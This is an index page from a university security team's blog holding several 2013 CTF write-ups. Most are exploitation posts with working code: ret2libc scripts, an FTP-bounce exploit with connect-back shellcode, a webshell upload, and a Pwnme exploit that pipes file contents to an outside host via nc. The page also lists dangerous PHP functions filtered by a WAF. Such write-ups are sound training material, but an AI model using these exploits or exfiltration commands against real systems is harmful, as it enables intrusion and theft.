
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>blue-lotus</title>
  <meta name="author" content="blue-lotus">

  
  <meta name="description" content="The binary is obfuscated by adding random 0xF0 in order to stop IDA from analyzing the binary correctly. So first we should de-obfuscate the binary. &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://www.blue-lotus.net/www/blog/page/3">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="blue-lotus" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">blue-lotus</a></h1>
  
    <h2>Security Research Team @ Tsinghua University</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="http://google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:www.blue-lotus.net/www" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div class="blog-index">
  
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/secuinside-2013-oldskewl-writeup/">Secuinside 2013 Oldskewl Writeup</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-06-09T00:00:00+08:00" pubdate data-updated="true">Jun 9<span>th</span>, 2013</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>The binary is obfuscated by adding random <em>0xF0</em> in order to stop IDA from analyzing the binary correctly. So first we should de-obfuscate the binary.</p>

<p>After de-obfuscation, we could find a tiny VM engine after spending some time in analysis. Function <em>0x4015b0</em> is the vital function for initializing VM dispatching functions. Sorry for those ambiguous function names <img src='http://www.blue-lotus.net/wp-includes/images/smilies/icon_razz.gif' alt=':P' class='wp-smiley' /> .</p>

<pre><code>/* 0x4015b0 */
struct_vm *__thiscall init_struct_vm(struct_vm *this)
{
  this-&gt;func1 = (int)func_acc_reg1;
  this-&gt;func2 = (int)func_read_data;
  this-&gt;func3 = (int)func_dereference;
  this-&gt;func4 = (int)func_shift_left;
  this-&gt;func5 = (int)func_nop_n;
  this-&gt;func6 = (int)func_nop_n_if_reg1_is_not_0;
  this-&gt;func7 = (int)func_end;
  return this;
}
</code></pre>

<p>After that it&#8217;s trivial to rip the actual VM&#8217;ed code out and reverse it into human-understandable logics. The code appears to be reading three strings out from the sokcet and hashing them. At first we thought it to be a hash-construction problem, but a hint told us a dictionary is needed. Then we had to write a Python script to bruteforce for hash collisions.</p>

<pre><code>def calc(lst):
    x = 0
    for i in range(0, len(lst)):
        x = ((x &lt;&lt; 16) &amp; 0xffffffff) + ((x &lt;&lt; 6) &amp; 0xffffffff) + x + ord(lst[i : i + 1])
        #x = ord(lst[i : i + 1]) + x * 65601
        x = x &amp; 0xffffffff
    return x

def main():
    for x in range(0, 0xff + 1):
        data = 0
        for y in range(0, 0xff + 1):
            for z in range(0, 0xff + 1):
                lst = []
                lst.append(x)
                lst.append(y)
                lst.append(z)
                data = calc(lst)
                if data == 0x38B7E73C:
                    print "Done!"
        print hex(data)

def find(base, index):
    if index &gt;= 15:
        return -1
    for i in range(0, 2000):
        d = base + i * 0x100000000
        x = d % 65601
        if x &lt;= 0x7f and x &gt; 0x0a:
            new_base = d - x
            new_base = new_base / 65601
            if new_base &lt;= 0x7f and new_base &gt; 0x0a:
                print "%02x %02x" % (new_base, x),
                return 0
            if find(new_base, index + 1) != -1:
                print "%02x" % x,
                return 0
    return -1

if __name__ == '__main__':
    remainder = 0
    base = []
    base.append(0x38b7e73c)
    base.append(0x991181ae)
    base.append(0x478692f9)
    # find(base, 0)
    f = open('wordsEn.TXT')
    data = f.read()
    f.close()
    strs = data.split('\n')
    for s in strs:
        result = calc(s)
        for b in base:
            if result == b:
                print "%x %s" % (b, s)

    for s1 in strs:
        print s1
        for s2 in strs:
            s = s1 + s2
            result = calc(s)
            for b in base:
                if result == b:
                    print "%x %s" % (b, s)

    print "finished"
</code></pre>

<p>Finally we got the flag: <strong>codename ancien regime</strong></p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/ebctf-2013-pwn-300-snake-writeup/">Ebctf 2013 Pwn 300 Snake Writeup</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-06-08T00:00:00+08:00" pubdate data-updated="true">Jun 8<span>th</span>, 2013</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>It&#8217;s a snake game.</p>

<p>Playing it for a while, we find that w,s,a,d can control the snake in 4 directions, &#8220;enter&#8221; key will stop the snake, and b will start the game in single step mode.</p>

<p>The clue printed before game started is important, it says, <code>HIT (ALMOST) ANY KEY TO START GAME</code>, so there must be some key which will generate different output. After some try and fail, we find that &#8216;#&#8217; key will dump the binary file in hex code. This is the first breakthrough we got. Now we can disassemble the binary and play the game locally.</p>

<p>Using the binary file, we find a stack overflow vulnerability immediately, which is located at game exit, used to input the player&#8217;s name, exposed by function <code>fgets</code>. But the logic of the game shows we need a score larger than 313336, which is impossible to acquire by playing the game.</p>

<p>By reading the assembly of the binary, we got some more findings. The first discovery indicates that if we get a score equal to 666, the program will print out some memory layout information. The second discovery shows that, if we get 1221 score, the program will erase the last 4 wall of the game board by space. Furthermore, the memory location of the walls locate adjacently to that of the score variable.</p>

<p>Knowing above, we can compose a solution now. First, use some input sequence, we can eat 6 dots and get the libc.so base address in memory. Then we eat 6 more dots, the bottom wall will open a 4-bytes-wide door. Move snake outside the play field, and overwrite 4 bytes after the wall, the score variable will be large enough to pass the high score check.</p>

<p><a href="http://www.blue-lotus.net/wp-content/uploads/2013/06/1221.png"><img src="http://www.blue-lotus.net/wp-content/uploads/2013/06/1221.png" alt="" width="600" class="alignnone size-medium wp-image-634" /></a></p>

<p>Now we just need to grab the shell using ret2libc. Calculate the system function offset and &#8220;/bin/sh&#8221; offset, using the offset provided by memory info printed. The final script is as follows, note that the system offset and &#8220;/bin/sh&#8221; offset need to be recalculated for different platforms.</p>

<pre><code>import struct

f = open('fifo', 'w')

def send(cmd):
    global f
    f.write(cmd)
    f.flush()

send('b')
s = 'd' * 28 + 's' * 3 + 'd' * 2 + 'w' * 5 + 'a' * 23 + 's' * 11 + 'd'* 27 + 'w' + 'w' * 3 + 'a' * 27 + 'w' * 5 + 'd' * 50 + 's' * 2 + 'a' * 38 + 's' * 11 + 'd' * 7 + 'w' * 7 + 'a' * 6 + 'w' * 9 + 'd' * 17 + 'd' * 2  + 'd' * 23 + 's' * 17 + 'd' * 6

send(s)

b = raw_input('please enter base address: ')

ba = "base = 0x" + b
print ba
exec ba

#base = 0xf75fe000
g = 'A' * 140 + struct.pack('I', base + 0x3e6c0) + struct.pack('I', base + 0x3e6c0 - 0xd1d0) + struct.pack('I', base + 0x160cbf) + struct.pack('I', 10) + 'pwd\n'

send(g)

while True:
    send(raw_input('$ ') + '\n\n')

raw_input("\npress any key to exit ...")
</code></pre>

<p>We used mkfifo to create a fifo file first. Then do the following:</p>

<pre><code>$ nc "ip" "port" &lt; fifo
$ python2 solve.py
  ... input the libc base address when it prints out.
&lt;/pre&gt;
&lt;p&gt;&lt;/p&gt;
Some solutions we seen write a lot of code to read server input and parse the libc base address, but it's much more easier to use pipe and input it manually. &lt;img src='http://www.blue-lotus.net/wp-includes/images/smilies/icon_smile.gif' alt=':)' class='wp-smiley' /&gt; 


aay, cbmixx, kelwin contribute most of the work for solving this problem. Thanks very much!
</code></pre>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/secuinside-ctf-2013-quals-pwnme-writeup/">Secuinside CTF 2013 Quals Pwnme Writeup</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-06-07T00:00:00+08:00" pubdate data-updated="true">Jun 7<span>th</span>, 2013</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>PIE is turned on when compilling pwnme. Position-Independent-Executable is a feature of GCC that allows the executable to behave like a shared library so base addresses can be relocatable.</p>

<p>The major part of the source of pwnme is as below:</p>

<pre><code>#define MYPORT 8181 
#define BUFSIZE 1024 

void main(void)
{
    char buf[BUFSIZE];
    ……    
    if (!fork()) { 
        send(client_fd, "what is your name? ", 19, 0);

        memset(buf, 0, sizeof(buf));
        recv(client_fd, buf, BUFSIZE+16, 0);
        send(client_fd, "nice to meet you!\n", 18, 0);

        printf("DEBUG : %s was here\n", buf);
        memset(buf, 0, sizeof(buf));
        close(client_fd);
        return 0;
    } else {
        close(client_fd);  
        while(waitpid(-1, NULL, WNOHANG) &gt; 0); 
    }
}
</code></pre>

<p>Obviously, it contains a basic stack overflow bug and we can only overwrite return address of <code>main</code> function. What&#8217;s worse, the first BUFSIZE bytes of buffer is set to 0 before return of <code>main</code>. However, a call of <code>printf</code> moves the input buffer to the stdout buffer. We can use a <code>leave ret</code> gadget to migrate the stack to the stdout buffer. So suppose we know base address, we can figure out the address of stdout buffer and perform a ret2libc attack using <code>system</code> function.</p>

<p>Pwnme forks a child process for each connection, so the base address will be the same with the parent process. Luckily, randomization on x86 Ubuntu is only 9-bits. We can perform a brute-force attack on the base address.</p>

<p>Our exploit code is as follows:</p>

<pre><code>import sys
import struct
import socket

HOST = "54.214.258.68"
HOST = "172.16.0.142"
PORT = 8181

def p(addr):
    return struct.pack("&lt;I", addr)

def exploit(base, host, port):
    print hex(base)
    leaveret = p(base + 0xe2953)
    ret = p(base + 0xe2954)
    ebp = p(base + 0x1b7034)
    cmd = '(ls;pwd;cat key) | nc 172.16.0.1 12345'
    cmd_addr = p(base + 0x1b738d)
    system = p(base + 0x41280)
    buf = 180 * ret + system + "AAAA" + cmd_addr + ' ' * (1040 - 180 * 4 - 12 - 1 - 40 - 8 - len(cmd)) + cmd + ';' + 'B' * 40 + ebp + leaveret

    try :
        s = socket.socket()
        s.connect((host, port))
        s.settimeout(3)
        s.recv(1024)
        s.send(buf)
        s.close()
        return True
    except socket.error:
        print "socket error!"
        return False
    else:
        sys.exit(1)

# base = 0xb7e23000
# exploit(base, HOST, PORT)

bases = range(0xb7500000, 0xb76ff000, 0x1000)
i = 0
while i &lt; len(bases):
    if exploit(bases[i], HOST, PORT):
        i += 1
</code></pre>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/secuinside-ctf-quals-2013-127-0-0-1-writeup/">Secuinside CTF Quals 2013 127.0.0.1 Writeup</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-06-04T00:00:00+08:00" pubdate data-updated="true">Jun 4<span>th</span>, 2013</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>We need to connect to a service restricted to be accessed from localhost only. An FTP server is also supplied to public.</p>

<p>Soon we realized that <code>PORT</code> command may help us bypass the limitation. For example,</p>

<pre>PORT 127,0,0,1,12,60
RETR /path/to/payload
</pre>


<p>will make FTP server connect to 127.0.0.1:3126, and send content of the file to it.</p>

<p>We just used standard buffer overflow way to run connect back shellcode and get the key.</p>

<p>Note that FTP server sends and then closes socket immediately, which means payload too short will cause <code>localonly</code> breaking its own sending procedure in early stage. We need payload large enough to make <code>send()</code> blocked until <code>recv()</code> called in localonly. 64kB seems to be OK for that.</p>

<pre>#!/usr/bin/env python2
import sys
from ftplib import FTP
from telnetlib import Telnet
import struct

from pwn import * # thanks pwnies
context('i386', 'linux', 'ipv4')

HOST = 
PORT = 
FTP_HOST = '54.214.247.89'

sc = asm(shellcode.connectback(HOST, PORT))

def get_payload(f, addr):
    f.write('\x90' * 88)
    f.write('\x00\xf2\xff\xbf')
    f.write(struct.pack('&lt;I&#039;, addr))

    f.write(&#039;\x90&#039; * (0x200 - len(sc) - 96))
    f.write(sc)
    f.write(&#039;\x90&#039; * (0x10000 - 0x200))

def upload(f, path):
    ftp = FTP(FTP_HOST)
    ftp.login()
    ftp.set_pasv(False)
    print ftp.storbinary(&#039;STOR &#039; + path, f)
    ftp.quit()
    f.close()

def run(path):
    s = Telnet(FTP_HOST, 21, 5)
    print s.read_until(&#039;220&#039;)
    s.write(&#039;USER anonymous\n&#039;)
    print s.read_until(&#039;331&#039;)
    s.write(&#039;PASS a\n&#039;)
    print s.read_until(&#039;230&#039;)
    s.write(&#039;TYPE I\n&#039;)
    print s.read_until(&#039;200&#039;)
    s.write(&#039;PORT 127,0,0,1,12,60\n&#039;)
    print s.read_until(&#039;200&#039;)
    s.write(&#039;RETR %s\n&#039; % path)
    print s.read_until(&#039;150&#039;)
    print s.read_until(&#039;226&#039;)
    s.write(&#039;QUIT\n&#039;)
    print s.read_until(&#039;221&#039;)
    s.close()


p = &#039;/tmp/p&#039;
fn = &#039;p&#039;
for addr in xrange(0xbfffff80, 0xbfff0000, -0x80):
    f = open(fn, &#039;wb&#039;)
    get_payload(f, addr)
    f.close()
    f = open(fn, &#039;rb&#039;)
    upload(f, p)
    run(p)
</pre>

</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/ebctf-2013-quals-for100-writeup/">EBCTF 2013 Quals For100 Writeup</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-06-04T00:00:00+08:00" pubdate data-updated="true">Jun 4<span>th</span>, 2013</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Just do as description</p>

<p><code>rev(steg.unhideBin(unhex(rot13(un7z(carve(xor(unhex(rot13(unrar(ebCTF_Teaser_FOR100.rar))))))))))</code></p>

<ul>
<li><code>unrar</code> and <code>un7z</code> needs the password, got it(<code>12</code> for <code>unrar</code>, <code>21</code> for <code>un7z</code>) by brute forcing.</li>
<li><code>xor</code> refers to <a href="http://en.wikipedia.org/wiki/XOR_cipher">XOR cipher</a> using 1 byte key. got it(<code>chr(66)</code>) by brute forcing.</li>
<li><code>carve</code> the 7z file concatenated to a png file</li>
<li><code>steg.unhideBin</code> was found in <a href="https://github.com/RobinDavid/LSB-Steganography">RobinDavid / LSB-Steganography</a></li>
</ul>


<p><img src="http://www.blue-lotus.net/wp-content/uploads/2013/06/flag.png" alt="Flag" /></p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/ebctf-2013-crypto-writeup/">Ebctf 2013 Crypto Writeup</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-06-03T00:00:00+08:00" pubdate data-updated="true">Jun 3<span>rd</span>, 2013</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>The problem offers 2 encrypted message and 1 secret key for one of them. And it&#8217;s our mission to decrypt the other message.</p>

<p>Plain message is divided into 16-bytes blocks, the encryption use sha256 to generate encryption cipher and xor the message to get encryption message.</p>

<p>So if we can get the first cipher used for encrypting the first message block, the rest can be calculated.</p>

<p>Use the secret key provided, we can decrypt one of the messages and it turns out to be an email.</p>

<blockquote><p>From: Vlugge Japie To: Baron van Neemweggen<br/>
** Subj: Weekly update</p>

<p>Boss,</p>

<p>Sorry, I failed to get my hands on the information you requested.<br/>
Please don&#8217;t tell the bureau &#8211; I&#8217;ll have it next week, promise!</p>

<p>Vlugge Japie</p>
So it&#8217;s very likely the other message should also be an email, and if this is true, we can get the first 16 bytes of plain text: &#8220;From: Vlugge Jap&#8221;. Use xor, we can get the cipher: xor(cipher, &#8220;From: Vlugge Jap&#8221;)</p></blockquote>

<p>The solution is straightforward now.</p>

<pre><code>import hashlib, string, sys

def xor(a, b):
    l = min(len(a), len(b))
    return ''.join([chr(ord(x) ^ ord(y)) for x, y in zip(a[:l], b[:l])])

def h(x):
    x = hashlib.sha256(x).digest()
    x = xor(x[:16], x[16:])
    return x

inp = open('msg002.enc').read()
msg = inp.decode('base64')
k = xor(msg[:16], 'From: Vlugge Jap')

out = ''
for i in xrange(0, len(msg), 16):
    out += xor(msg[i:i+16], k)
    k = h(k + str(len(msg)))

print out
</code></pre>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/secuinside-ctf-quals-2013-bigfile-of-secret-writeup/">Secuinside CTF Quals 2013 Bigfile of Secret Writeup</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-06-02T00:00:00+08:00" pubdate data-updated="true">Jun 2<span>nd</span>, 2013</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>The file to download is huge, but we can use an HTTP range request to download the last part of the file. <code>curl</code> has a dedicated option to specify the <code>Range</code> header:</p>

<pre><code>curl -r -500 http://119.70.231.180/secret_memo.txt
</code></pre>

<p>[1] <a href="http://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html#sec14.35">http://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html#sec14.35</a></p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/secuinside-ctf-2013-quals-secure-web-writeup/">Secuinside CTF 2013 Quals Secure Web Writeup</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-06-02T00:00:00+08:00" pubdate data-updated="true">Jun 2<span>nd</span>, 2013</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>This problem consists a so plugin and web application. H.Shao analyzes the so plugin, and found out it was acting as a WAF, intended to filter out dangerous actions</p>

<pre><code>  if ( strstr(haystack, "php") )//no php
  {
    ap_log_cerror("mod_dontwebhack300.c", 130, 3, 0, v13, "be my guest. lol xD");
    *v15 = 1;
  }
  haystack = strstr(haystack, "filename");//must have filename
  if ( !haystack )
    return 0;
  v9 = get_filename(haystack);
  ap_log_cerror("mod_dontwebhack300.c", 138, 3, 0, v13, v9);
  if ( *v15 == 1 || check_bad_php_string(v13, src) == 1 )// forbid dangerous functions
    return 120000;
</code></pre>

<p>Disallowed functions:</p>

<pre><code>v11 = "passthru";
v12 = "fpassthru";
v13 = "system";
v14 = "`";
v15 = "execl";
v16 = "open";
v17 = "popen";
v18 = "escapeshellcmd";
v19 = "eval";
v20 = "proc_open";
v21 = "get_contents";
</code></pre>

<p>However, some mistakes occurred in the server configuration, causing the WAF working abnormally, thus exposing the application to the outside, which means one can upload any php webshell with full functionalities to the server . Given the source code of upload page:</p>

<pre><code>$uploaddir = '/var/www/uploads/' . md5($_SERVER["REMOTE_ADDR"]) . '/';

if(is_dir($uploaddir) == false)
    mkdir($uploaddir);
$uploadfile = $uploaddir . basename($_FILES['data']['name']);

if (move_uploaded_file($_FILES['data']['tmp_name'], $uploadfile)) {
    echo "Success\n";
} else {
    print "failed\n";
}
</code></pre>

<p>We could figure out the uploaded directory is md5(client_ip). Then we uploaded a webshell and connect back a shell. We found the server had gcc installed with linux version 3.8.0.</p>

<p>We first thought we might need root, so we tried several local root exploit but failed, also we didn&#8217;t found many other teams&#8217; exploit, so this may not be a right way.</p>

<p>At this time the wandering aay found the home directory, and the flag file was just there&#8230; problem solved this way.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/secuinside-ctf-2013-quals-reader-writeup/">Secuinside CTF 2013 Quals Reader Writeup</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-05-31T00:00:00+08:00" pubdate data-updated="true">May 31<span>st</span>, 2013</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>We found several stack overflows in <code>reader</code>. One in the function of checking the filename and another in the function of parsing the file. But both functions are protected by stack cookies. The only function that does not contain stack cookie is as below:</p>

<pre><code>int __cdecl print_file(char *buffer)
{
  unsigned int i; // [sp+18h] [bp-20h]@1
  char s[7]; // [sp+1Ch] [bp-1Ch]@1
  ……
  *((_DWORD *)buffer + 6) = &amp;i;
  ……
  sub_8048C7A(buffer);
}
</code></pre>

<p>We can see that the <code>buffer</code> pointer in the stack is passed to another function <code>sub_8048C7A</code> as below:</p>

<pre><code>int __cdecl sub_8048C7A(char *buffer)
{
  ……
  len = strlen(buffer + 83);
  copy_str(*((char **)buffer + 6), (char *)ptr, len);
  ……
}
</code></pre>

<p><code>sub_8048C7A</code> will copy a string to the stack with incorrect length. So the return address of <code>print_file</code> can be overlapped. We can specify both the length and the string source contents by deliberately constructing the input file.</p>

<p>To get a shell, we used a simple ret2libc attack. To get precise address functions in glibc, we disable ASLR of shared library by a well-known ulimit trick.</p>

<pre><code>ulimit -s unlimited
</code></pre>

<p>Python script to construct the input file is as below:</p>

<pre><code>import struct

def p(addr):
    return struct.pack("&lt;I", addr)

system_addr = p(0x4006b280)
binsh_addr = p(0x40192ff8)
ret2libc = system_addr + "aaaa" + binsh_addr

f = open('exploit.sec', 'w')
b = "\xff"+"SECUINSIDE"+"\x00"+"a"*12+"\x00"+"b"*15+"1234"+"a"*8+"c"*10+"b"*50+"\xff"*4
b +='\x05\x00\x00\x00' # buffer1
b +='\x32\x00\x00\x00' # buffer2
b +='\x05\x00\x00\x00' # buffer3
b +='\x10\x00\x00\x00'
b +='\x01'
b += 'a' * 5 
b += 'a' * 36 + ret2libc + 'b'*(50 - len(ret2libc) - 36)
b += 'a' * 5
f.write(b)
f.close
</code></pre>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/secuinside-ctf-quals-2013-pe_time-writeup/">Secuinside CTF Quals 2013 PE_Time Writeup</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-05-29T00:00:00+08:00" pubdate data-updated="true">May 29<span>th</span>, 2013</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>PE_Time.exe is a traditional Windows Form Application.</p>

<p>Once executed, a window named <strong><em>MyEdit</em></strong> will be created and a <strong>Window Procedure</strong> located at 0x004010F0 will be registered to handle all the messages sent to this window.</p>

<p><img src="http://www.blue-lotus.net/wp-content/uploads/2013/05/1.jpg" alt="enter image description here" /></p>

<p>After looking into the Window Procedure, we can easily find a piece of code that deal with the <strong>WM_COMMAND</strong> message &#8212; the message sent when the user selects a command item from a menu, when a control sends a notification message to its parent window, or when an accelerator keystroke is translated.</p>

<p><img src="http://www.blue-lotus.net/wp-content/uploads/2013/05/2.jpg" alt="enter image description here" /></p>

<p>Looking down along those code, we find it use the <strong>GetWindowTextA()</strong> API to obtain a text that typed into an EditBox controls, and then do some conversion to each byte of the input text.</p>

<p><img src="http://www.blue-lotus.net/wp-content/uploads/2013/05/31.jpg" alt="enter image description here" /></p>

<p>A similar Loop has been used to deal with each byte of the input text, here is a pseudocode for each Loop:</p>

<pre><code>while(LoopCount--)
{
    InputText[i] -= LoopCount;
    InputText[i] ^= XorKey;
}
</code></pre>

<p>After converting all the four bytes, it will compare it with a string <strong><em>&#8220;C;@R&#8221;</em></strong>. Once the string is match, we will get a congratulation.</p>

<p><img src="http://www.blue-lotus.net/wp-content/uploads/2013/05/5.jpg" alt="enter image description here" /></p>

<p>So the key must be what we input and it is very easy to be worked out:</p>

<pre><code>#givemekey.py
str = 'C;@R'
keystr = ''

key = ord(str[0])
for i in range(1, 6):
    key = key ^ 3
    key = key + i
keystr = keystr + chr(key)

key = ord(str[1])
for i in range(1, 5):
    key = key ^ 4
    key = key + i
keystr = keystr + chr(key)

key = ord(str[2])
for i in range(1, 4):
    key = key ^ 5
    key = key + i
keystr = keystr + chr(key)

key = ord(str[3])
for i in range(1, 3):
    key = key ^ 6
    key = key + i
keystr = keystr + chr(key)

print keystr
</code></pre>

<p>Here is the key:</p>

<p><img src="http://www.blue-lotus.net/wp-content/uploads/2013/05/6.jpg" alt="enter image description here" /></p>
</div>
  
  


    </article>
  
  <div class="pagination">
    
      <a class="prev" href="/blog/page/4/">&larr; Older</a>
    
    <a href="/blog/archives">Blog Archives</a>
    
    <a class="next" href="/blog/page/2/">Newer &rarr;</a>
    
  </div>
</div>
<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/asis-ctf-finals-2013-login/">ASIS CTF Finals 2013 Login</a>
      </li>
    
      <li class="post">
        <a href="/asis-ctf-memdump-writeup/">ASIS CTF Memdump Writeup</a>
      </li>
    
      <li class="post">
        <a href="/ufo-ctf-2013-reverse-keygenme-writeup/">UFO CTF 2013 Reverse &#8211; KeyGenMe Writeup</a>
      </li>
    
      <li class="post">
        <a href="/ufoctf2013-web100-flagstore/">UFOCTF2013 Web100 FlagStore</a>
      </li>
    
      <li class="post">
        <a href="/sigint-2013-crypto300-satisfaction/">SIGINT 2013 Crypto300 Satisfaction</a>
      </li>
    
  </ul>
</section>





  
</aside>

    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2013 - blue-lotus -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
